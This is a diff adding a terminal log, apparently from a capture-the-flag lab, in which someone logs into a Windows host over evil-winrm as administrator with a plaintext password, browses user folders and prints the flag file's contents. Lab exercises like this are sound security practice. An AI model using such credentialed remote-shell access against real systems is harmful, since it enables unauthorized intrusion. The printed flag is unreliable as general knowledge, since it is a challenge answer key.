@@ -1,0 +1,55 @@
+sudo evil-winrm -u administrator -p badminton -i 10.129.172.181
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                      
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                 
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/9/2022   5:35 PM                Administrator
+d-----          3/9/2022   5:33 PM                mike
+d-r---        10/10/2020  12:37 PM                Public
+
+
+*Evil-WinRM* PS C:\Users> cd mike
+*Evil-WinRM* PS C:\Users\mike> ls
+
+
+    Directory: C:\Users\mike
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/10/2022   4:51 AM                Desktop
+
+
+*Evil-WinRM* PS C:\Users\mike> cd Destop
+Cannot find path 'C:\Users\mike\Destop' because it does not exist.
+At line:1 char:1
++ cd Destop
++ ~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\mike\Destop:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users\mike> cd Desktop
+*Evil-WinRM* PS C:\Users\mike\Desktop> ls
+
+
+    Directory: C:\Users\mike\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
+ea81b7afddd03efaa0945333ed147fac
+*Evil-WinRM* PS C:\Users\mike\Desktop> 
